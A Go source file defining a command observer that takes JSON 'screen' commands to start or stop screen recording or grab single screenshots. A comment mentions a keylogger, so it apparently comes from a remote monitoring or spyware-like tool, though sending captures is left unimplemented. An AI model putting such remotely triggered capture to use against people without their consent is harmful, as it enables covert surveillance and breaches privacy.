package internal

import (
	"encoding/json"
	"log"
)

// KeyLogger commands Observer
type ScreenshotCmdObserver struct {
	recorder         *ScreenRecorder
	recordingChannel chan *Screenshot
}

func (o *ScreenshotCmdObserver) execute(string_json string) {
	var req ScreenRequest
	err := json.Unmarshal([]byte(string_json), &req)

	if err != nil {
		log.Println("Not a screen parse request")
		return
	}

	if req.Cmd != "screen" {
		return
	}

	log.Println("ScreenshotCmdObserver: command received:", string_json)

	switch req.Action {
	// Recording screen operations
	case "record":

		switch req.Action_status {
		case "start":
			seconds := req.Seconds

			// TODO: implement recording by number of seconds requested
			_ = seconds

			// Starts recording in a folder
			o.startRecording()
			break

		case "stop":
			// Stops recording
			o.stopRecording()
			break
		}

		break

	// Take only one shot
	case "screenshot":
		shot := o.shot()
		if shot == nil {
			// Prepare response
			break
		}

		// TODO: send screenshot
		// ..

		break
	}
}

func (o *ScreenshotCmdObserver) startRecording() {
	o.recordingChannel = make(chan *Screenshot)

	go func() {
		o.recorder.StartCapturing(o.recordingChannel)

		for {
			shot := <-o.recordingChannel
			log.Printf("SHOT (%s)%s - %s \n", shot.FileGroup, shot.FileName, shot.FilePath)
		}
	}()
}

func (o *ScreenshotCmdObserver) stopRecording() {
	o.recorder.StopCapturing()
}

func (o *ScreenshotCmdObserver) shot() *Screenshot {
	// Set 'tmp' as group for the folder
	// This folder must be temporary; holds only
	// screenshots requested
	return o.recorder.ScreenShot("tmp")
}

func NewScreenshotCmdObserver(recorder *ScreenRecorder) *ScreenshotCmdObserver {
	return &ScreenshotCmdObserver{
		recorder: recorder,
	}
}
